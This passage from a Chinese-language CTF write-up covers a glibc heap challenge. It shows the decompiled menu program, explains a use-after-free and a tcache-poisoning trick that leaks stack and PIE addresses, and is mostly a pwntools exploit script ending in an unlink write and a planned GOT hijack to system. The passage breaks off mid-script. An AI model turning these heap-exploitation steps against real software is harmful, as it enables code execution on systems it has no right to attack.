style="color:#DBD7CAEE"> __fastcall __noreturn </span><span style="color:#80A665">main</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">int</span><span style="color:#BD976A"> argc</span><span style="color:#666666">,</span><span style="color:#CB7676"> const</span><span style="color:#CB7676"> char</span><span style="color:#CB7676"> **</span><span style="color:#BD976A">argv</span><span style="color:#666666">,</span><span style="color:#CB7676"> const</span><span style="color:#CB7676"> char</span><span style="color:#CB7676"> **</span><span style="color:#BD976A">envp</span><span style="color:#5eaab5">)</span><br><span style="color:#5eaab5">{</span><br><span style="color:#CB7676">  int</span><span style="color:#DBD7CAEE"> v3</span><span style="color:#666666">;</span><span style="color:#758575DD"> // eax</span><br><br><span style="color:#DBD7CAEE">  the_chunk </span><span style="color:#666666">=</span><span style="color:#80A665"> malloc</span><span style="color:#4d9375">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">5F8</span><span style="color:#CB7676">uLL</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#80A665">  free</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">the_chunk</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#4D9375">  while</span><span style="color:#666666"> </span><span style="color:#4d9375">(</span><span style="color:#4C9A91"> 1</span><span style="color:#666666"> </span><span style="color:#4d9375">)</span><br><span style="color:#666666">  </span><span style="color:#4d9375">{</span><br><span style="color:#4D9375">    while</span><span style="color:#666666"> </span><span style="color:#d4976c">(</span><span style="color:#4C9A91"> 1</span><span style="color:#666666"> </span><span style="color:#d4976c">)</span><br><span style="color:#666666">    </span><span style="color:#d4976c">{</span><br><span style="color:#DBD7CAEE">      v3 </span><span style="color:#666666">=</span><span style="color:#80A665"> prompt</span><span style="color:#d9739f">(</span><span style="color:#d9739f">)</span><span style="color:#666666">;</span><br><span style="color:#4D9375">      if</span><span style="color:#666666"> </span><span style="color:#d9739f">(</span><span style="color:#DBD7CAEE"> v3 </span><span style="color:#CB7676">!=</span><span style="color:#4C9A91"> 4</span><span style="color:#666666"> </span><span style="color:#d9739f">)</span><br><span style="color:#4D9375">        break</span><span style="color:#666666">;</span><br><span style="color:#80A665">      read_chunk</span><span style="color:#d9739f">(</span><span style="color:#d9739f">)</span><span style="color:#666666">;</span><br><span style="color:#666666">    </span><span style="color:#d4976c">}</span><br><span style="color:#4D9375">    if</span><span style="color:#666666"> </span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE"> v3 </span><span style="color:#CB7676">></span><span style="color:#4C9A91"> 4</span><span style="color:#666666"> </span><span style="color:#d4976c">)</span><br><span style="color:#4D9375">      break</span><span style="color:#666666">;</span><br><span style="color:#4D9375">    switch</span><span style="color:#666666"> </span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE"> v3 </span><span style="color:#d4976c">)</span><br><span style="color:#666666">    </span><span style="color:#d4976c">{</span><br><span style="color:#4D9375">      case</span><span style="color:#4C9A91"> 3</span><span style="color:#666666">:</span><br><span style="color:#80A665">        write_chunk</span><span style="color:#d9739f">(</span><span style="color:#d9739f">)</span><span style="color:#666666">;</span><br><span style="color:#4D9375">        break</span><span style="color:#666666">;</span><br><span style="color:#4D9375">      case</span><span style="color:#4C9A91"> 1</span><span style="color:#666666">:</span><br><span style="color:#80A665">        alloc_chunk</span><span style="color:#d9739f">(</span><span style="color:#d9739f">)</span><span style="color:#666666">;</span><br><span style="color:#4D9375">        break</span><span style="color:#666666">;</span><br><span style="color:#4D9375">      case</span><span style="color:#4C9A91"> 2</span><span style="color:#666666">:</span><br><span style="color:#80A665">        free_chunk</span><span style="color:#d9739f">(</span><span style="color:#d9739f">)</span><span style="color:#666666">;</span><br><span style="color:#4D9375">        break</span><span style="color:#666666">;</span><br><span style="color:#4D9375">      default</span><span style="color:#666666">:</span><br><span style="color:#4D9375">        goto</span><span style="color:#DBD7CAEE"> LABEL_12</span><span style="color:#666666">;</span><br><span style="color:#666666">    </span><span style="color:#d4976c">}</span><br><span style="color:#666666">  </span><span style="color:#4d9375">}</span><br><span style="color:#DBD7CAEE">LABEL_12:</span><br><span style="color:#80A665">  _exit</span><span style="color:#4d9375">(</span><span style="color:#4C9A91">1</span><span style="color:#4d9375">)</span><span style="color:#666666">;</span><br><span style="color:#5eaab5">}</span><br></code></pre></div>
<p>题目的洞其实很明显，就是 <code class="inline-code">free_chunk</code> 里的 UAF，所以可以比较方便的泄漏 libc 和 pie，现在问题是题目没有任何 IO 函数，也没有使用 <code class="inline-code">exit</code>，所以没办法打 io 链，只能打栈。</p>
<p>但是打栈肯定得先泄漏 environ，这里就有个问题，<code class="inline-code">write_chunk</code> 和 <code class="inline-code">read_chunk</code> 功能都只能对堆上前 0x5f8 操作。</p>
<p>所以目前只有任意地址申请/释放，但是没有任意地址读写原语。怎么办呢.jpg</p>
<p>在往常做题的观念里，要想泄漏 <code class="inline-code">environ</code> 打栈肯定得先有任意地址读，这个原语一般都是通过任意地址申请然后 <code class="inline-code">show</code> 实现的，但其实我们忽略了 tcachebins 特别神秘的特性，如下。</p>
<p>首先，假设我们 free 三个堆块进入 tcachebins:</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-bash language-bash"><span style="color:#59873A">tcachebins</span><br><span style="color:#59873A">0x30</span><span style="color:#393A34"> </span><span style="color:rgba(255, 18, 18, 0.8)">[</span><span style="color:#393A34">  </span><span style="color:#B56959">3]:</span><span style="color:#2F798A"> 0x63de3bdf16c0</span><span style="color:#B56959"> —▸</span><span style="color:#2F798A"> 0x63de3bdf16f0</span><span style="color:#B56959"> —▸</span><span style="color:#2F798A"> 0x63de3bdf1720</span><span style="color:#B56959"> ◂—</span><span style="color:#2F798A"> 0</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-bash language-bash"><span style="color:#80A665">tcachebins</span><br><span style="color:#80A665">0x30</span><span style="color:#DBD7CAEE"> </span><span style="color:rgba(255, 18, 18, 0.8)">[</span><span style="color:#DBD7CAEE">  </span><span style="color:#C98A7D">3]:</span><span style="color:#4C9A91"> 0x63de3bdf16c0</span><span style="color:#C98A7D"> —▸</span><span style="color:#4C9A91"> 0x63de3bdf16f0</span><span style="color:#C98A7D"> —▸</span><span style="color:#4C9A91"> 0x63de3bdf1720</span><span style="color:#C98A7D"> ◂—</span><span style="color:#4C9A91"> 0</span><br></code></pre></div>
<p>然后，我们像往常（tcache posiong）一样，修改：</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-bash language-bash"><span style="color:#59873A">tcachebins</span><br><span style="color:#59873A">0x30</span><span style="color:#393A34"> </span><span style="color:rgba(255, 18, 18, 0.8)">[</span><span style="color:#393A34">  </span><span style="color:#B56959">3]:</span><span style="color:#2F798A"> 0x63de3bdf16c0</span><span style="color:#B56959"> —▸</span><span style="color:#2F798A"> 0x7c9da18046e0</span><span style="color:#393A34"> </span><span style="color:#1e754f">(</span><span style="color:#393A34">__libc_argv</span><span style="color:#1e754f">)</span><span style="color:#393A34"> ◂— 0x7ff96336b65c</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-bash language-bash"><span style="color:#80A665">tcachebins</span><br><span style="color:#80A665">0x30</span><span style="color:#DBD7CAEE"> </span><span style="color:rgba(255, 18, 18, 0.8)">[</span><span style="color:#DBD7CAEE">  </span><span style="color:#C98A7D">3]:</span><span style="color:#4C9A91"> 0x63de3bdf16c0</span><span style="color:#C98A7D"> —▸</span><span style="color:#4C9A91"> 0x7c9da18046e0</span><span style="color:#DBD7CAEE"> </span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">__libc_argv</span><span style="color:#4d9375">)</span><span style="color:#DBD7CAEE"> ◂— 0x7ff96336b65c</span><br></code></pre></div>
<p>最后，我们申请两个 chunk 出来</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-bash language-bash"><span style="color:#59873A">tcachebins</span><br><span style="color:#59873A">0x30</span><span style="color:#393A34"> </span><span style="color:rgba(255, 18, 18, 0.8)">[</span><span style="color:#393A34">  </span><span style="color:#B56959">1]:</span><span style="color:#2F798A"> 0x7ff96336b65c</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-bash language-bash"><span style="color:#80A665">tcachebins</span><br><span style="color:#80A665">0x30</span><span style="color:#DBD7CAEE"> </span><span style="color:rgba(255, 18, 18, 0.8)">[</span><span style="color:#DBD7CAEE">  </span><span style="color:#C98A7D">1]:</span><span style="color:#4C9A91"> 0x7ff96336b65c</span><br></code></pre></div>
<p>这说明我们成功的在 <code class="inline-code">tcache pthread struct</code> 上踩出了一个栈地址，但这个暂时不能用，因为我们的读函数不能读 tps。</p>
<p>更重要的是，此时我们再释放一个同大小的 chunkA 进入 tcachebins，就可以在 chunkA 的 fd 处同样踩出一个栈地址，这个栈地址正好是我们可以泄漏的地址。</p>
<p>按照这个方法，我们可以泄漏栈上的 pie 地址。</p>
<p>然后简单利用 unlink 任意地址写原语，将 <code class="inline-code">the_chunk</code> 写成 <code class="inline-code">the_chunk - 0x18</code>，之后打栈或者打 got 表都可以。</p>
<p>exp:</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-python language-python"><span style="color:#A0ADA0">#!/usr/bin/env python3</span><br><br><span style="color:#1E754F">from</span><span style="color:#393A34"> pwn </span><span style="color:#1E754F">import</span><span style="color:#AB5959"> *</span><br><span style="color:#1E754F">from</span><span style="color:#393A34"> sys </span><span style="color:#1E754F">import</span><span style="color:#393A34"> argv</span><br><br><span style="color:#393A34">proc </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">./one_write_patched</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">log_level </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">info</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">binary </span><span style="color:#999999">=</span><span style="color:#393A34"> proc</span><br><span style="color:#393A34">elf </span><span style="color:#999999">=</span><span style="color:#393A34"> ELF</span><span style="color:#2993a3">(</span><span style="color:#393A34">proc</span><span style="color:#999999">,</span><span style="color:#B07D48"> checksec</span><span style="color:#999999">=</span><span style="color:#1E754F">False</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">libc </span><span style="color:#999999">=</span><span style="color:#393A34"> ELF</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">./libc.so.6</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> checksec</span><span style="color:#999999">=</span><span style="color:#1E754F">False</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io </span><span style="color:#999999">=</span><span style="color:#393A34"> remote</span><span style="color:#2993a3">(</span><span style="color:#B5695977">""</span><span style="color:#999999">,</span><span style="color:#999999"> </span><span style="color:#2993a3">)</span><span style="color:#1E754F"> if</span><span style="color:#393A34"> argv</span><span style="color:#2993a3">[</span><span style="color:#2F798A">1</span><span style="color:#2993a3">]</span><span style="color:#AB5959"> ==</span><span style="color:#B5695977"> '</span><span style="color:#B56959">r</span><span style="color:#B5695977">'</span><span style="color:#1E754F"> else</span><span style="color:#393A34"> process</span><span style="color:#2993a3">(</span><span style="color:#393A34">proc</span><span style="color:#2993a3">)</span><br><br><span style="color:#1E754F">if</span><span style="color:#393A34"> args</span><span style="color:#999999">.</span><span style="color:#393A34">G</span><span style="color:#999999">:</span><br><span style="color:#393A34">    gdb</span><span style="color:#999999">.</span><span style="color:#393A34">attach</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">,</span><span style="color:#B5695977"> """</span><br><span style="color:#B56959">        dir ~/CTFhub/Problems/Pwn/glibc/malloc</span><br><span style="color:#B56959">        b* _int_free_merge_chunk+144</span><br><span style="color:#B5695977">    """</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> choose</span><span style="color:#2993a3">(</span><span style="color:#393A34">id</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">> </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#998418"> str</span><span style="color:#1e754f">(</span><span style="color:#998418">id</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> alloc</span><span style="color:#2993a3">(</span><span style="color:#393A34">idx</span><span style="color:#999999">,</span><span style="color:#393A34"> size</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    choose</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">idx: </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#998418"> str</span><span style="color:#1e754f">(</span><span style="color:#393A34">idx</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">size: </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#998418"> str</span><span style="color:#1e754f">(</span><span style="color:#393A34">size</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> free</span><span style="color:#2993a3">(</span><span style="color:#393A34">idx</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    choose</span><span style="color:#2993a3">(</span><span style="color:#2F798A">2</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">idx: </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#998418"> str</span><span style="color:#1e754f">(</span><span style="color:#393A34">idx</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> write</span><span style="color:#2993a3">(</span><span style="color:#393A34">content</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    choose</span><span style="color:#2993a3">(</span><span style="color:#2F798A">3</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">data: </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#393A34"> content</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> show</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    choose</span><span style="color:#2993a3">(</span><span style="color:#2F798A">4</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#393A34">alloc</span><span style="color:#2993a3">(</span><span style="color:#2F798A">0</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">410</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">alloc</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">410</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">alloc</span><span style="color:#2993a3">(</span><span style="color:#2F798A">50</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">20</span><span style="color:#2993a3">)</span><br><br><span style="color:#A0ADA0"># leak libc and heap address</span><br><span style="color:#393A34">free</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">alloc</span><span style="color:#2993a3">(</span><span style="color:#2F798A">2</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">20</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">alloc</span><span style="color:#2993a3">(</span><span style="color:#2F798A">3</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">20</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">alloc</span><span style="color:#2993a3">(</span><span style="color:#2F798A">4</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">20</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">alloc</span><span style="color:#2993a3">(</span><span style="color:#2F798A">5</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">20</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">show</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recv</span><span style="color:#2993a3">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">420</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">libc_addr </span><span style="color:#999999">=</span><span style="color:#393A34"> u64</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recv</span><span style="color:#1e754f">(</span><span style="color:#2F798A">8</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> -</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">203f10</span><br><span style="color:#393A34">libc</span><span style="color:#999999">.</span><span style="color:#393A34">address </span><span style="color:#999999">=</span><span style="color:#393A34"> libc_addr</span><br><span style="color:#393A34">log</span><span style="color:#999999">.</span><span style="color:#393A34">info</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"libc_addr => </span><span style="color:#1e754f">{</span><span style="color:#998418">hex</span><span style="color:#a65e2b">(</span><span style="color:#393A34">libc_addr</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recv</span><span style="color:#2993a3">(</span><span style="color:#2F798A">8</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">heap_addr </span><span style="color:#999999">=</span><span style="color:#393A34"> u64</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recv</span><span style="color:#1e754f">(</span><span style="color:#2F798A">8</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">log</span><span style="color:#999999">.</span><span style="color:#393A34">info</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"heap_addr => </span><span style="color:#1e754f">{</span><span style="color:#998418">hex</span><span style="color:#a65e2b">(</span><span style="color:#393A34">heap_addr</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><br><span style="color:#A0ADA0"># leak __libc_argv to get stack addr</span><br><span style="color:#393A34">free</span><span style="color:#2993a3">(</span><span style="color:#2F798A">4</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">free</span><span style="color:#2993a3">(</span><span style="color:#2F798A">3</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">free</span><span style="color:#2993a3">(</span><span style="color:#2F798A">2</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">environ </span><span style="color:#999999">=</span><span style="color:#393A34"> libc_addr </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">2046e0</span><br><span style="color:#393A34">target </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">environ </span><span style="color:#AB5959">^</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#393A34">heap_addr </span><span style="color:#AB5959">></span><span style="color:#AB5959">></span><span style="color:#2F798A"> 12</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">payload </span><span style="color:#999999">=</span><span style="color:#393A34"> flat</span><span style="color:#2993a3">(</span><span style="color:#1e754f">[</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#A65E2B">\x00</span><span style="color:#B5695977">"</span><span style="color:#AB5959"> *</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">410</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">31</span><span style="color:#999999">,</span><span style="color:#393A34">target</span><span style="color:#1e754f">]</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">write</span><span style="color:#2993a3">(</span><span style="color:#393A34">payload</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">alloc</span><span style="color:#2993a3">(</span><span style="color:#2F798A">51</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">20</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">alloc</span><span style="color:#2993a3">(</span><span style="color:#2F798A">52</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">20</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">free</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">show</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recv</span><span style="color:#2993a3">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">420</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">stack_addr </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">u64</span><span style="color:#1e754f">(</span><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recv</span><span style="color:#a65e2b">(</span><span style="color:#2F798A">8</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">)</span><span style="color:#AB5959"> ^</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#393A34">heap_addr </span><span style="color:#AB5959">></span><span style="color:#AB5959">></span><span style="color:#2F798A"> 12</span><span style="color:#1e754f">)</span><span style="color:#AB5959"> ^</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#393A34">environ </span><span style="color:#AB5959">></span><span style="color:#AB5959">></span><span style="color:#2F798A"> 12</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">log</span><span style="color:#999999">.</span><span style="color:#393A34">info</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"stack_addr => </span><span style="color:#1e754f">{</span><span style="color:#998418">hex</span><span style="color:#a65e2b">(</span><span style="color:#393A34">stack_addr</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><br><span style="color:#A0ADA0"># leak pie base via stack</span><br><span style="color:#393A34">target </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">stack_addr </span><span style="color:#AB5959">-</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">48</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> ^</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">heap_addr </span><span style="color:#AB5959">></span><span style="color:#AB5959">></span><span style="color:#2F798A"> 12</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">payload </span><span style="color:#999999">=</span><span style="color:#393A34"> flat</span><span style="color:#2993a3">(</span><span style="color:#1e754f">[</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#A65E2B">\x00</span><span style="color:#B5695977">"</span><span style="color:#AB5959"> *</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">410</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">31</span><span style="color:#999999">,</span><span style="color:#393A34"> target</span><span style="color:#1e754f">]</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">write</span><span style="color:#2993a3">(</span><span style="color:#393A34">payload</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">alloc</span><span style="color:#2993a3">(</span><span style="color:#2F798A">53</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">20</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">alloc</span><span style="color:#2993a3">(</span><span style="color:#2F798A">54</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">20</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">free</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">show</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recv</span><span style="color:#2993a3">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">420</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">pie_addr </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#393A34">u64</span><span style="color:#1e754f">(</span><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recv</span><span style="color:#a65e2b">(</span><span style="color:#2F798A">8</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">)</span><span style="color:#AB5959"> ^</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#393A34">heap_addr </span><span style="color:#AB5959">></span><span style="color:#AB5959">></span><span style="color:#2F798A"> 12</span><span style="color:#1e754f">)</span><span style="color:#AB5959"> ^</span><span style="color:#999999"> </span><span style="color:#1e754f">(</span><span style="color:#393A34">stack_addr </span><span style="color:#AB5959">></span><span style="color:#AB5959">></span><span style="color:#2F798A"> 12</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> -</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">10b0</span><br><span style="color:#393A34">log</span><span style="color:#999999">.</span><span style="color:#393A34">info</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"pie_addr => </span><span style="color:#1e754f">{</span><span style="color:#998418">hex</span><span style="color:#a65e2b">(</span><span style="color:#393A34">pie_addr</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><br><span style="color:#A0ADA0"># write the_chunk by unlink</span><br><span style="color:#393A34">alloc</span><span style="color:#2993a3">(</span><span style="color:#2F798A">55</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">20</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">alloc</span><span style="color:#2993a3">(</span><span style="color:#2F798A">56</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">350</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">the_chunk </span><span style="color:#999999">=</span><span style="color:#393A34"> pie_addr </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">4080</span><br><span style="color:#393A34">payload </span><span style="color:#999999">=</span><span style="color:#393A34"> flat</span><span style="color:#2993a3">(</span><span style="color:#1e754f">[</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">/bin/sh</span><span style="color:#A65E2B">\x00</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">411</span><span style="color:#999999">,</span><span style="color:#393A34"> the_chunk </span><span style="color:#AB5959">-</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">18</span><span style="color:#999999">,</span><span style="color:#393A34"> the_chunk </span><span style="color:#AB5959">-</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">10</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#A65E2B">\x00</span><span style="color:#B5695977">"</span><span style="color:#AB5959"> *</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">3f0</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">410</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">420</span><span style="color:#1e754f">]</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">write</span><span style="color:#2993a3">(</span><span style="color:#393A34">payload</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">free</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#2993a3">)</span><br><br><span style="color:#A0ADA0"># hijack free@got to system and get 